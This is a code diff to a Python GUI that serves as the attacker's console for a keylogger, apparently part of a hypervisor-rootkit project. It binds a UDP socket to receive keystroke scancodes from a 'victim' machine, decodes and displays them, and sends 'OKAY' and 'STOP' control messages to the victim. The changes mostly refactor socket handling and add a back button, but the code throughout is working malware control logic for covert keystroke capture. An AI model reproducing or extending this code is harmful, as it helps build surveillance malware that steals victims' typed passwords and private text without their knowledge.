@@ -38,9 +38,7 @@ scan_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 scan_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 scan_sock.bind(('', SCAN_PORT))
 
-keylogging_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-keylogging_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-keylogging_sock.bind(('', KEYLOGS_PORT))
+keylogging_socks = queue.Queue()
 
 shift_on = False
 caps_on = False
@@ -302,20 +300,30 @@ class KeyloggerFrame(ctk.CTkFrame):
         self.grid_rowconfigure(0, weight=1)
         self.grid_rowconfigure(1, weight=4)
         self.grid_columnconfigure(0, weight=1)
+        self.grid_columnconfigure(1, weight=5)
 
         self.label = ctk.CTkLabel(self, text="Keylogger", font=("Arial", 30))
-        self.label.grid(row=0, column=0, padx=0, pady=5, sticky="")
+        self.label.grid(row=0, column=0, columnspan=2, padx=0, pady=5, sticky="")
         self.textbox = ctk.CTkTextbox(self, font=("Arial", 16))
-        self.textbox.grid(row=1, column=0, sticky="nsew")
+        self.textbox.grid(row=1, column=0, columnspan=2, sticky="nsew")
         
+        self.go_back_image = ctk.CTkImage(dark_image=Image.open("/home/gognl/vmbr/attacker/arrow.png"), size=(50, 50))
+        self.go_back_button = ctk.CTkButton(self, text="", image=self.go_back_image, command=self.go_back_callback, width=50, height=50, fg_color="transparent")
+        self.go_back_button.grid(row=0, column=0, padx=10, pady=10, sticky="w")
+
         self.textbox.configure(state="disabled")
+
+        self.keylogging_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        self.keylogging_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        keylogging_socks.put(self.keylogging_sock)
 
         self.thread = threading.Thread(target=self.start)
 
     def start(self):
+        self.keylogging_sock.bind(('', KEYLOGS_PORT))
         scan_sock.sendto(b"OKAY", self.victim[1])
         while True:
-            data, address = keylogging_sock.recvfrom(256)
+            data, address = self.keylogging_sock.recvfrom(256)
             if (address != self.victim[1]):
                 continue
             logs = decode_scancodes(data[1:])
@@ -330,6 +338,12 @@ class KeyloggerFrame(ctk.CTkFrame):
                 
             self.textbox.insert('end', logs)
             self.textbox.configure(state="disabled")
+    
+    def go_back_callback(self):
+        scan_sock.sendto(b"STOP", self.victim[1])
+        self.keylogging_sock.close()
+        self.destroy()
+        self.app.redisplay_entry_frame()
 
 
 class App(ctk.CTk):
@@ -387,10 +401,12 @@ class App(ctk.CTk):
             scan_sock.close()
         except Exception as e:
             pass
-        try:
-            keylogging_sock.close()
-        except Exception as e:
-            pass
+        while not keylogging_socks.empty():
+            s = keylogging_socks.get()
+            try:
+                s.close()
+            except Exception as e:
+                pass
         self.destroy()
 
 
